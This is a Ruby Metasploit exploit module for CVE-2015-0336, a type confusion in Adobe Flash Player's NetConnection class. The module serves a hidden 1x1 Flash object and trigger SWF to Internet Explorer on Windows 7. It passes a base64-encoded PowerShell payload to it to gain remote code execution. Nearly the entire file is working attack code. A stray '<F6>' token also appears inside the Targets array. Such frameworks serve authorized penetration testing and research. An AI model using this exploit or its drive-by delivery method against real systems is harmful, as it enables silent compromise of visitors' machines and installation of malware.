##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Powershell
  include Msf::Exploit::Remote::BrowserExploitServer

  def initialize(info={})
    super(update_info(info,
      'Name'                => 'Adobe Flash Player NetConnection Type Confusion',
      'Description'         => %q{
        This module exploits a type confusion vulnerability in the NetConnection class on
        Adobe Flash Player. When using a correct memory layout this vulnerability allows
        to corrupt arbitrary memory. It can be used to overwrite dangerous objects, like
        vectors, and finally accomplish remote code execution. This module has been tested
        successfully on Windows 7 SP1 (32-bit), IE 8 and IE11 with Flash 16.0.0.305.
      },
      'License'             => MSF_LICENSE,
      'Author'              =>
        [
          'Natalie Silvanovich', # Vulnerability discovery and Google Project Zero Exploit
          'Unknown', # Exploit in the wild
          'juan vazquez' # msf module
        ],
      'References'          =>
        [
          ['CVE', '2015-0336'],
          ['URL', 'https://helpx.adobe.com/security/products/flash-player/apsb15-05.html'],
          ['URL', 'http://googleprojectzero.blogspot.com/2015/04/a-tale-of-two-exploits.html'],
          ['URL', 'http://malware.dontneedcoffee.com/2015/03/cve-2015-0336-flash-up-to-1600305-and.html'],
          ['URL', 'https://www.fireeye.com/blog/threat-research/2015/03/cve-2015-0336_nuclea.html'],
          ['URL', 'https://blog.malwarebytes.org/exploits-2/2015/03/nuclear-ek-leverages-recently-patched-flash-vulnerability/']
        ],
      'Payload'             =>
        {
          'DisableNops' => true
        },
      'Platform'            => 'win',
      'BrowserRequirements' =>
        {
          :source  => /script|headers/i,
          :os_name => OperatingSystems::Match::WINDOWS_7,
          :ua_name => Msf::HttpClients::IE,
          :flash   => lambda { |ver| ver =~ /^16\./ && Gem::Version.new(ver) <= Gem::Version.new('16.0.0.305') },
          :arch    => ARCH_X86
        },
      'Targets'             =>
   <F6>     [
          [ 'Automatic', {} ]
        ],
      'Privileged'          => false,
      'DisclosureDate'      => 'Mar 12 2015',
      'DefaultTarget'       => 0))
  end

  def exploit
    @swf = create_swf
    @trigger = create_trigger
    super
  end

  def on_request_exploit(cli, request, target_info)
    print_status("Request: #{request.uri}")

    if request.uri =~ /\.swf$/
      print_status('Sending SWF...')
      send_response(cli, @swf, {'Content-Type'=>'application/x-shockwave-flash', 'Cache-Control' => 'no-cache, no-store', 'Pragma' => 'no-cache'})
      return
    end

    print_status('Sending HTML...')
    send_exploit_html(cli, exploit_template(cli, target_info), {'Pragma' => 'no-cache'})
  end

  def exploit_template(cli, target_info)
    swf_random = "#{rand_text_alpha(4 + rand(3))}.swf"
    target_payload = get_payload(cli, target_info)
    psh_payload = cmd_psh_payload(target_payload, 'x86', {remove_comspec: true})
    b64_payload = Rex::Text.encode_base64(psh_payload)

    trigger_hex_stream = @trigger.unpack('H*')[0]

    html_template = %Q|<html>
    <body>
    <object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab" width="1" height="1" />
    <param name="movie" value="<%=swf_random%>" />
    <param name="allowScriptAccess" value="always" />
    <param name="FlashVars" value="sh=<%=b64_payload%>&tr=<%=trigger_hex_stream%>" />
    <param name="Play" value="true" />
    <embed type="application/x-shockwave-flash" width="1" height="1" src="<%=swf_random%>" allowScriptAccess="always" FlashVars="sh=<%=b64_payload%>&tr=<%=trigger_hex_stream%>" Play="true"/>
    </object>
    </body>
    </html>
    |

    return html_template, binding()
  end

  def create_swf
    path = ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2015-0336', 'msf.swf')
    swf =  ::File.open(path, 'rb') { |f| swf = f.read }

    swf
  end

  def create_trigger
    path = ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2015-0336', 'trigger.swf')
    swf =  ::File.open(path, 'rb') { |f| swf = f.read }

    swf
  end
end
